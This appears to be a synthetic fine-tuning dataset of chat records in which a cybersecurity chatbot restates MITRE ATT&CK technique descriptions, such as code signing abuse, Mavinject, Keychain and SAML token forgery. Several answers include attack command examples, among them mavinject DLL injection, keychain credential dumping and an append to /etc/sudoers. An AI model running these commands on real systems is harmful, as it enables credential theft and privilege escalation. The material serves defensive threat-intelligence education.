{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Code Signing' and with the Id: T1116 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Code Signing' and with the Id: T1116 is described as follows: Code signing provides a level of authenticity on a binary from the developer and a guarantee that the binary has not been tampered with. (Citation: Wikipedia Code Signing) However, adversaries are known to use code signing certificates to masquerade malware and tools as legitimate binaries (Citation: Janicab). The certificates used during an operation may be created, forged, or stolen by the adversary. (Citation: Securelist Digital Certificates) (Citation: Symantec Digital Certificates)Code signing to verify software on first run can be used on modern Windows and macOS/OS X systems. It is not used on Linux due to the decentralized nature of the platform. (Citation: Wikipedia Code Signing)Code signing certificates may be used to bypass security policies that require signed code to execute on a system.. The systems targeted by this attack pattern are: macOS, Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Mavinject' and with the Id: T1218.013 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Mavinject' and with the Id: T1218.013 is described as follows: Adversaries may abuse mavinject.exe to proxy execution of malicious code. Mavinject.exe is the Microsoft Application Virtualization Injector, a Windows utility that can inject code into external processes as part of Microsoft Application Virtualization (App-V).(Citation: LOLBAS Mavinject)Adversaries may abuse mavinject.exe to inject malicious DLLs into running processes (i.e. [Dynamic-link Library Injection](https://attack.mitre.org/techniques/T1055/001)), allowing for arbitrary code execution (ex. <code>C:\\Windows\\system32\\mavinject.exe PID /INJECTRUNNING PATH_DLL</code>).(Citation: ATT Lazarus TTP Evolution)(Citation: Reaqta Mavinject) Since mavinject.exe may be digitally signed by Microsoft, proxying execution via this method may evade detection by security products because the execution is masked under a legitimate process. In addition to [Dynamic-link Library Injection](https://attack.mitre.org/techniques/T1055/001), Mavinject.exe can also be abused to perform import descriptor injection via its  <code>/HMODULE</code> command-line parameter (ex. <code>mavinject.exe PID /HMODULE=BASE_ADDRESS PATH_DLL ORDINAL_NUMBER</code>). This command would inject an import table entry consisting of the specified DLL into the module at the given base address.(Citation: Mavinject Functionality Deconstructed). The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Cloud Instance Metadata API' and with the Id: T1522 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Cloud Instance Metadata API' and with the Id: T1522 is described as follows: Adversaries may attempt to access the Cloud Instance Metadata API to collect credentials and other sensitive data.Most cloud service providers support a Cloud Instance Metadata API which is a service provided to running virtual instances that allows applications to access information about the running virtual instance. Available information generally includes name, security group, and additional metadata including sensitive data such as credentials and UserData scripts that may contain additional secrets. The Instance Metadata API is provided as a convenience to assist in managing applications and is accessible by anyone who can access the instance.(Citation: AWS Instance Metadata API)If adversaries have a presence on the running virtual instance, they may query the Instance Metadata API directly to identify credentials that grant access to additional resources. Additionally, attackers may exploit a Server-Side Request Forgery (SSRF) vulnerability in a public facing web proxy that allows the attacker to gain access to the sensitive information via a request to the Instance Metadata API.(Citation: RedLock Instance Metadata API 2018)The de facto standard across cloud service providers is to host the Instance Metadata API at <code>http[:]//169.254.169.254</code>.. The systems targeted by this attack pattern are: IaaS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Process Hollowing' and with the Id: T1093 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Process Hollowing' and with the Id: T1093 is described as follows: Process hollowing occurs when a process is created in a suspended state then its memory is unmapped and replaced with malicious code. Similar to [Process Injection](https://attack.mitre.org/techniques/T1055), execution of the malicious code is masked under a legitimate process and may evade defenses and detection analysis. (Citation: Leitch Hollowing) (Citation: Elastic Process Injection July 2017). The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Local Data Staging' and with the Id: T1074.001 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Local Data Staging' and with the Id: T1074.001 is described as follows: Adversaries may stage collected data in a central location or directory on the local system prior to Exfiltration. Data may be kept in separate files or combined into one file through techniques such as [Archive Collected Data](https://attack.mitre.org/techniques/T1560). Interactive command shells may be used, and common functionality within [cmd](https://attack.mitre.org/software/S0106) and bash may be used to copy data into a staging location.Adversaries may also stage collected data in various available formats/locations of a system, including local storage databases/repositories or the Windows Registry.(Citation: Prevailion DarkWatchman 2021). The systems targeted by this attack pattern are: Linux, macOS, Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Match Legitimate Name or Location' and with the Id: T1036.005 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Match Legitimate Name or Location' and with the Id: T1036.005 is described as follows: Adversaries may match or approximate the name or location of legitimate files or resources when naming/placing them. This is done for the sake of evading defenses and observation. This may be done by placing an executable in a commonly trusted directory (ex: under System32) or giving it the name of a legitimate, trusted program (ex: svchost.exe). In containerized environments, this may also be done by creating a resource in a namespace that matches the naming convention of a container pod or cluster. Alternatively, a file or container image name given may be a close approximation to legitimate programs/images or something innocuous.Adversaries may also use the same icon of the file they are trying to mimic.. The systems targeted by this attack pattern are: Linux, macOS, Windows, Containers ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Domain Fronting' and with the Id: T1172 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Domain Fronting' and with the Id: T1172 is described as follows: Domain fronting takes advantage of routing schemes in Content Delivery Networks (CDNs) and other services which host multiple domains to obfuscate the intended destination of HTTPS traffic or traffic tunneled through HTTPS. (Citation: Fifield Blocking Resistent Communication through domain fronting 2015) The technique involves using different domain names in the SNI field of the TLS header and the Host field of the HTTP header. If both domains are served from the same CDN, then the CDN may route to the address specified in the HTTP header after unwrapping the TLS header. A variation of the the technique, \"domainless\" fronting, utilizes a SNI field that is left blank; this may allow the fronting to work even when the CDN attempts to validate that the SNI and HTTP Host fields match (if the blank SNI fields are ignored).For example, if domain-x and domain-y are customers of the same CDN, it is possible to place domain-x in the TLS header and domain-y in the HTTP header. Traffic will appear to be going to domain-x, however the CDN may route it to domain-y.. The systems targeted by this attack pattern are: Linux, macOS, Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Digital Certificates' and with the Id: T1587.003 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Digital Certificates' and with the Id: T1587.003 is described as follows: Adversaries may create self-signed SSL/TLS certificates that can be used during targeting. SSL/TLS certificates are designed to instill trust. They include information about the key, information about its owner's identity, and the digital signature of an entity that has verified the certificate's contents are correct. If the signature is valid, and the person examining the certificate trusts the signer, then they know they can use that key to communicate with its owner. In the case of self-signing, digital certificates will lack the element of trust associated with the signature of a third-party certificate authority (CA).Adversaries may create self-signed SSL/TLS certificates that can be used to further their operations, such as encrypting C2 traffic (ex: [Asymmetric Cryptography](https://attack.mitre.org/techniques/T1573/002) with [Web Protocols](https://attack.mitre.org/techniques/T1071/001)) or even enabling [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557) if added to the root of trust (i.e. [Install Root Certificate](https://attack.mitre.org/techniques/T1553/004)).After creating a digital certificate, an adversary may then install that certificate (see [Install Digital Certificate](https://attack.mitre.org/techniques/T1608/003)) on infrastructure under their control.. The systems targeted by this attack pattern are: PRE ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Stored Data Manipulation' and with the Id: T1565.001 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Stored Data Manipulation' and with the Id: T1565.001 is described as follows: Adversaries may insert, delete, or manipulate data at rest in order to influence external outcomes or hide activity, thus threatening the integrity of the data.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making.Stored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.. The systems targeted by this attack pattern are: Linux, macOS, Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Password Cracking' and with the Id: T1110.002 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Password Cracking' and with the Id: T1110.002 is described as follows: Adversaries may use password cracking to attempt to recover usable credentials, such as plaintext passwords, when credential material such as password hashes are obtained. [OS Credential Dumping](https://attack.mitre.org/techniques/T1003) can be used to obtain password hashes, this may only get an adversary so far when [Pass the Hash](https://attack.mitre.org/techniques/T1550/002) is not an option. Further,  adversaries may leverage [Data from Configuration Repository](https://attack.mitre.org/techniques/T1602) in order to obtain hashed credentials for network devices.(Citation: US-CERT-TA18-106A) Techniques to systematically guess the passwords used to compute hashes are available, or the adversary may use a pre-computed rainbow table to crack hashes. Cracking hashes is usually done on adversary-controlled systems outside of the target network.(Citation: Wikipedia Password cracking) The resulting plaintext password resulting from a successfully cracked hash may be used to log into systems, resources, and services in which the account has access.. The systems targeted by this attack pattern are: Linux, macOS, Windows, Office 365, Azure AD, Network ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'SID-History Injection' and with the Id: T1178 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'SID-History Injection' and with the Id: T1178 is described as follows: The Windows security identifier (SID) is a unique value that identifies a user or group account. SIDs are used by Windows security in both security descriptors and access tokens. (Citation: Microsoft SID) An account can hold additional SIDs in the SID-History Active Directory attribute (Citation: Microsoft SID-History Attribute), allowing inter-operable account migration between domains (e.g., all values in SID-History are included in access tokens).Adversaries may use this mechanism for privilege escalation. With Domain Administrator (or equivalent) rights, harvested or well-known SID values (Citation: Microsoft Well Known SIDs Jun 2017) may be inserted into SID-History to enable impersonation of arbitrary users/groups such as Enterprise Administrators. This manipulation may result in elevated access to local resources and/or access to otherwise inaccessible domains via lateral movement techniques such as [Remote Services](https://attack.mitre.org/techniques/T1021), [Windows Admin Shares](https://attack.mitre.org/techniques/T1077), or [Windows Remote Management](https://attack.mitre.org/techniques/T1028).. The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Local Email Collection' and with the Id: T1114.001 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Local Email Collection' and with the Id: T1114.001 is described as follows: Adversaries may target user email on local systems to collect sensitive information. Files containing email data can be acquired from a user\u2019s local system, such as Outlook storage or cache files.Outlook stores data locally in offline data files with an extension of .ost. Outlook 2010 and later supports .ost file sizes up to 50GB, while earlier versions of Outlook support up to 20GB.(Citation: Outlook File Sizes) IMAP accounts in Outlook 2013 (and earlier) and POP accounts use Outlook Data Files (.pst) as opposed to .ost, whereas IMAP accounts in Outlook 2016 (and later) use .ost files. Both types of Outlook data files are typically stored in `C:\\Users\\<username>\\Documents\\Outlook Files` or `C:\\Users\\<username>\\AppData\\Local\\Microsoft\\Outlook`.(Citation: Microsoft Outlook Files). The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Keychain' and with the Id: T1555.001 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Keychain' and with the Id: T1555.001 is described as follows: Adversaries may acquire credentials from Keychain. Keychain (or Keychain Services) is the macOS credential management system that stores account names, passwords, private keys, certificates, sensitive application data, payment data, and secure notes. There are three types of Keychains: Login Keychain, System Keychain, and Local Items (iCloud) Keychain. The default Keychain is the Login Keychain, which stores user passwords and information. The System Keychain stores items accessed by the operating system, such as items shared among users on a host. The Local Items (iCloud) Keychain is used for items synced with Apple\u2019s iCloud service. Keychains can be viewed and edited through the Keychain Access application or using the command-line utility <code>security</code>. Keychain files are located in <code>~/Library/Keychains/</code>, <code>/Library/Keychains/</code>, and <code>/Network/Library/Keychains/</code>.(Citation: Keychain Services Apple)(Citation: Keychain Decryption Passware)(Citation: OSX Keychain Schaumann)Adversaries may gather user credentials from Keychain storage/memory. For example, the command <code>security dump-keychain \u2013d</code> will dump all Login Keychain credentials from <code>~/Library/Keychains/login.keychain-db</code>. Adversaries may also directly read Login Keychain credentials from the <code>~/Library/Keychains/login.keychain</code> file. Both methods require a password, where the default password for the Login Keychain is the current user\u2019s password to login to the macOS host.(Citation: External to DA, the OS X Way)(Citation: Empire Keychain Decrypt)  . The systems targeted by this attack pattern are: macOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Boot or Logon Autostart Execution' and with the Id: T1547 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Boot or Logon Autostart Execution' and with the Id: T1547 is described as follows: Adversaries may configure system settings to automatically execute a program during system boot or logon to maintain persistence or gain higher-level privileges on compromised systems. Operating systems may have mechanisms for automatically running a program on system boot or account logon.(Citation: Microsoft Run Key)(Citation: MSDN Authentication Packages)(Citation: Microsoft TimeProvider)(Citation: Cylance Reg Persistence Sept 2013)(Citation: Linux Kernel Programming) These mechanisms may include automatically executing programs that are placed in specially designated directories or are referenced by repositories that store configuration information, such as the Windows Registry. An adversary may achieve the same goal by modifying or extending features of the kernel.Since some boot or logon autostart programs run with higher privileges, an adversary may leverage these to elevate privileges.. The systems targeted by this attack pattern are: Linux, macOS, Windows, Network ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'LSA Secrets' and with the Id: T1003.004 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'LSA Secrets' and with the Id: T1003.004 is described as follows: Adversaries with SYSTEM access to a host may attempt to access Local Security Authority (LSA) secrets, which can contain a variety of different credential materials, such as credentials for service accounts.(Citation: Passcape LSA Secrets)(Citation: Microsoft AD Admin Tier Model)(Citation: Tilbury Windows Credentials) LSA secrets are stored in the registry at <code>HKEY_LOCAL_MACHINE\\SECURITY\\Policy\\Secrets</code>. LSA secrets can also be dumped from memory.(Citation: ired Dumping LSA Secrets)[Reg](https://attack.mitre.org/software/S0075) can be used to extract from the Registry. [Mimikatz](https://attack.mitre.org/software/S0002) can be used to extract secrets from memory.(Citation: ired Dumping LSA Secrets). The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Port Monitors' and with the Id: T1013 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Port Monitors' and with the Id: T1013 is described as follows: A port monitor can be set through the  (Citation: AddMonitor) API call to set a DLL to be loaded at startup. (Citation: AddMonitor) This DLL can be located in <code>C:\\Windows\\System32</code> and will be loaded by the print spooler service, spoolsv.exe, on boot. The spoolsv.exe process also runs under SYSTEM level permissions. (Citation: Bloxham) Alternatively, an arbitrary DLL can be loaded if permissions allow writing a fully-qualified pathname for that DLL to <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Print\\Monitors</code>. The Registry key contains entries for the following:* Local Port* Standard TCP/IP Port* USB Monitor* WSD PortAdversaries can use this technique to load malicious code at startup that will persist on system reboot and execute as SYSTEM.. The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Weaken Encryption' and with the Id: T1600 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Weaken Encryption' and with the Id: T1600 is described as follows: Adversaries may compromise a network device\u2019s encryption capability in order to bypass encryption that would otherwise protect data communications. (Citation: Cisco Synful Knock Evolution)Encryption can be used to protect transmitted network traffic to maintain its confidentiality (protect against unauthorized disclosure) and integrity (protect against unauthorized changes). Encryption ciphers are used to convert a plaintext message to ciphertext and can be computationally intensive to decipher without the associated decryption key. Typically, longer keys increase the cost of cryptanalysis, or decryption without the key.Adversaries can compromise and manipulate devices that perform encryption of network traffic. For example, through behaviors such as [Modify System Image](https://attack.mitre.org/techniques/T1601), [Reduce Key Space](https://attack.mitre.org/techniques/T1600/001), and [Disable Crypto Hardware](https://attack.mitre.org/techniques/T1600/002), an adversary can negatively effect and/or eliminate a device\u2019s ability to securely encrypt network traffic. This poses a greater risk of unauthorized disclosure and may help facilitate data manipulation, Credential Access, or Collection efforts. (Citation: Cisco Blog Legacy Device Attacks). The systems targeted by this attack pattern are: Network ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'SAML Tokens' and with the Id: T1606.002 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'SAML Tokens' and with the Id: T1606.002 is described as follows: An adversary may forge SAML tokens with any permissions claims and lifetimes if they possess a valid SAML token-signing certificate.(Citation: Microsoft SolarWinds Steps) The default lifetime of a SAML token is one hour, but the validity period can be specified in the <code>NotOnOrAfter</code> value of the <code>conditions ...</code> element in a token. This value can be changed using the <code>AccessTokenLifetime</code> in a <code>LifetimeTokenPolicy</code>.(Citation: Microsoft SAML Token Lifetimes) Forged SAML tokens enable adversaries to authenticate across services that use SAML 2.0 as an SSO (single sign-on) mechanism.(Citation: Cyberark Golden SAML)An adversary may utilize [Private Keys](https://attack.mitre.org/techniques/T1552/004) to compromise an organization's token-signing certificate to create forged SAML tokens. If the adversary has sufficient permissions to establish a new federation trust with their own Active Directory Federation Services (AD FS) server, they may instead generate their own trusted token-signing certificate.(Citation: Microsoft SolarWinds Customer Guidance) This differs from [Steal Application Access Token](https://attack.mitre.org/techniques/T1528) and other similar behaviors in that the tokens are new and forged by the adversary, rather than stolen or intercepted from legitimate users.An adversary may gain administrative Azure AD privileges if a SAML token is forged which claims to represent a highly privileged account. This may lead to [Use Alternate Authentication Material](https://attack.mitre.org/techniques/T1550), which may bypass multi-factor and other authentication protection mechanisms.(Citation: Microsoft SolarWinds Customer Guidance). The systems targeted by this attack pattern are: Azure AD, SaaS, Windows, Office 365, Google Workspace, IaaS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Spearphishing Link' and with the Id: T1192 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Spearphishing Link' and with the Id: T1192 is described as follows: Spearphishing with a link is a specific variant of spearphishing. It is different from other forms of spearphishing in that it employs the use of links to download malware contained in email, instead of attaching malicious files to the email itself, to avoid defenses that may inspect email attachments. All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this case, the malicious emails contain links. Generally, the links will be accompanied by social engineering text and require the user to actively click or copy and paste a URL into a browser, leveraging [User Execution](https://attack.mitre.org/techniques/T1204). The visited website may compromise the web browser using an exploit, or the user will be prompted to download applications, documents, zip files, or even executables depending on the pretext for the email in the first place. Adversaries may also include links that are intended to interact directly with an email reader, including embedded images intended to exploit the end system directly or verify the receipt of an email (i.e. web bugs/web beacons). Links may also direct users to malicious applications  designed to [Steal Application Access Token](https://attack.mitre.org/techniques/T1528)s, like OAuth tokens, in order to gain access to protected applications and information.(Citation: Trend Micro Pawn Storm OAuth 2017). The systems targeted by this attack pattern are: Windows, macOS, Linux, Office 365, SaaS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Masquerade File Type' and with the Id: T1036.008 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Masquerade File Type' and with the Id: T1036.008 is described as follows: Adversaries may masquerade malicious payloads as legitimate files through changes to the payload's formatting, including the file\u2019s signature, extension, and contents. Various file types have a typical standard format, including how they are encoded and organized. For example, a file\u2019s signature (also known as header or magic bytes) is the beginning bytes of a file and is often used to identify the file\u2019s type. For example, the header of a JPEG file,  is <code> 0xFF 0xD8</code> and the file extension is either `.JPE`, `.JPEG` or `.JPG`. Adversaries may edit the header\u2019s hex code and/or the file extension of a malicious payload in order to bypass file validation checks and/or input sanitization. This behavior is commonly used when payload files are transferred (e.g., [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105)) and stored (e.g., [Upload Malware](https://attack.mitre.org/techniques/T1608/001)) so that adversaries may move their malware without triggering detections. Common non-executable file types and extensions, such as text files (`.txt`) and image files (`.jpg`, `.gif`, etc.) may be typically treated as benign.  Based on this, adversaries may use a file extension to disguise malware, such as naming a PHP backdoor code with a file name of <code>test.gif</code>. A user may not know that a file is malicious due to the benign appearance and file extension.Polygot files, which are files that have multiple different file types and that function differently based on the application that will execute them, may also be used to disguise malicious malware and capabilities.(Citation: polygot_icedID). The systems targeted by this attack pattern are: Linux, macOS, Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Service Stop' and with the Id: T1489 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Service Stop' and with the Id: T1489 is described as follows: Adversaries may stop or disable services on a system to render those services unavailable to legitimate users. Stopping critical services or processes can inhibit or stop response to an incident or aid in the adversary's overall objectives to cause damage to the environment.(Citation: Talos Olympic Destroyer 2018)(Citation: Novetta Blockbuster) Adversaries may accomplish this by disabling individual services of high importance to an organization, such as <code>MSExchangeIS</code>, which will make Exchange content inaccessible (Citation: Novetta Blockbuster). In some cases, adversaries may stop or disable many or all services to render systems unusable.(Citation: Talos Olympic Destroyer 2018) Services or processes may not allow for modification of their data stores while running. Adversaries may stop services or processes in order to conduct [Data Destruction](https://attack.mitre.org/techniques/T1485) or [Data Encrypted for Impact](https://attack.mitre.org/techniques/T1486) on the data stores of services like Exchange and SQL Server.(Citation: SecureWorks WannaCry Analysis). The systems targeted by this attack pattern are: Windows, Linux, macOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Malware' and with the Id: T1587.001 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Malware' and with the Id: T1587.001 is described as follows: Adversaries may develop malware and malware components that can be used during targeting. Building malicious software can include the development of payloads, droppers, post-compromise tools, backdoors (including backdoored images), packers, C2 protocols, and the creation of infected removable media. Adversaries may develop malware to support their operations, creating a means for maintaining control of remote machines, evading defenses, and executing post-compromise behaviors.(Citation: Mandiant APT1)(Citation: Kaspersky Sofacy)(Citation: ActiveMalwareEnergy)(Citation: FBI Flash FIN7 USB)As with legitimate development efforts, different skill sets may be required for developing malware. The skills needed may be located in-house, or may need to be contracted out. Use of a contractor may be considered an extension of that adversary's malware development capabilities, provided the adversary plays a role in shaping requirements and maintains a degree of exclusivity to the malware.Some aspects of malware development, such as C2 protocol development, may require adversaries to obtain additional infrastructure. For example, malware developed that will communicate with Twitter for C2, may require use of [Web Services](https://attack.mitre.org/techniques/T1583/006).(Citation: FireEye APT29). The systems targeted by this attack pattern are: PRE ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Regsvcs/Regasm' and with the Id: T1121 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Regsvcs/Regasm' and with the Id: T1121 is described as follows: Regsvcs and Regasm are Windows command-line utilities that are used to register .NET Component Object Model (COM) assemblies. Both are digitally signed by Microsoft. (Citation: MSDN Regsvcs) (Citation: MSDN Regasm)Adversaries can use Regsvcs and Regasm to proxy execution of code through a trusted Windows utility. Both utilities may be used to bypass process whitelisting through use of attributes within the binary to specify code that should be run before registration or unregistration: <code>[ComRegisterFunction]</code> or <code>[ComUnregisterFunction]</code> respectively. The code with the registration and unregistration attributes will be executed even if the process is run under insufficient privileges and fails to execute. (Citation: LOLBAS Regsvcs)(Citation: LOLBAS Regasm). The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Device Driver Discovery' and with the Id: T1652 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Device Driver Discovery' and with the Id: T1652 is described as follows: Adversaries may attempt to enumerate local device drivers on a victim host. Information about device drivers may highlight various insights that shape follow-on behaviors, such as the function/purpose of the host, present security tools (i.e. [Security Software Discovery](https://attack.mitre.org/techniques/T1518/001)) or other defenses (e.g., [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497)), as well as potential exploitable vulnerabilities (e.g., [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068)).Many OS utilities may provide information about local device drivers, such as `driverquery.exe` and the `EnumDeviceDrivers()` API function on Windows.(Citation: Microsoft Driverquery)(Citation: Microsoft EnumDeviceDrivers) Information about device drivers (as well as associated services, i.e., [System Service Discovery](https://attack.mitre.org/techniques/T1007)) may also be available in the Registry.(Citation: Microsoft Registry Drivers)On Linux/macOS, device drivers (in the form of kernel modules) may be visible within `/dev` or using utilities such as `lsmod` and `modinfo`.(Citation: Linux Kernel Programming)(Citation: lsmod man)(Citation: modinfo man). The systems targeted by this attack pattern are: Linux, macOS, Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Sudo Caching' and with the Id: T1206 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Sudo Caching' and with the Id: T1206 is described as follows: The <code>sudo</code> command \"allows a system administrator to delegate authority to give certain users (or groups of users) the ability to run some (or all) commands as root or another user while providing an audit trail of the commands and their arguments.\" (Citation: sudo man page 2018) Since sudo was made for the system administrator, it has some useful configuration features such as a <code>timestamp_timeout</code> that is the amount of time in minutes between instances of <code>sudo</code> before it will re-prompt for a password. This is because <code>sudo</code> has the ability to cache credentials for a period of time. Sudo creates (or touches) a file at <code>/var/db/sudo</code> with a timestamp of when sudo was last run to determine this timeout. Additionally, there is a <code>tty_tickets</code> variable that treats each new tty (terminal session) in isolation. This means that, for example, the sudo timeout of one tty will not affect another tty (you will have to type the password again).Adversaries can abuse poor configurations of this to escalate privileges without needing the user's password. <code>/var/db/sudo</code>'s timestamp can be monitored to see if it falls within the <code>timestamp_timeout</code> range. If it does, then malware can execute sudo commands without needing to supply the user's password. When <code>tty_tickets</code> is disabled, adversaries can do this from any tty for that user. The OSX Proton Malware has disabled <code>tty_tickets</code> to potentially make scripting easier by issuing <code>echo \\'Defaults !tty_tickets\\' >> /etc/sudoers</code>  (Citation: cybereason osx proton). In order for this change to be reflected, the Proton malware also must issue <code>killall Terminal</code>. As of macOS Sierra, the sudoers file has <code>tty_tickets</code> enabled by default.. The systems targeted by this attack pattern are: Linux, macOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Domain Account' and with the Id: T1087.002 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Domain Account' and with the Id: T1087.002 is described as follows: Adversaries may attempt to get a listing of domain accounts. This information can help adversaries determine which domain accounts exist to aid in follow-on behavior such as targeting specific accounts which possess particular privileges.Commands such as <code>net user /domain</code> and <code>net group /domain</code> of the [Net](https://attack.mitre.org/software/S0039) utility, <code>dscacheutil -q group</code>on macOS, and <code>ldapsearch</code> on Linux can list domain users and groups. [PowerShell](https://attack.mitre.org/techniques/T1059/001) cmdlets including <code>Get-ADUser</code> and <code>Get-ADGroupMember</code> may enumerate members of Active Directory groups.(Citation: CrowdStrike StellarParticle January 2022)  . The systems targeted by this attack pattern are: Linux, macOS, Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Active Setup' and with the Id: T1547.014 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Active Setup' and with the Id: T1547.014 is described as follows: Adversaries may achieve persistence by adding a Registry key to the Active Setup of the local machine. Active Setup is a Windows mechanism that is used to execute programs when a user logs in. The value stored in the Registry key will be executed after a user logs into the computer.(Citation: Klein Active Setup 2010) These programs will be executed under the context of the user and will have the account's associated permissions level.Adversaries may abuse Active Setup by creating a key under <code> HKLM\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\</code> and setting a malicious value for <code>StubPath</code>. This value will serve as the program that will be executed when a user logs into the computer.(Citation: Mandiant Glyer APT 2010)(Citation: Citizenlab Packrat 2015)(Citation: FireEye CFR Watering Hole 2012)(Citation: SECURELIST Bright Star 2015)(Citation: paloalto Tropic Trooper 2016)Adversaries can abuse these components to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also use [Masquerading](https://attack.mitre.org/techniques/T1036) to make the Registry entries look as if they are associated with legitimate programs.. The systems targeted by this attack pattern are: Windows ."}]}
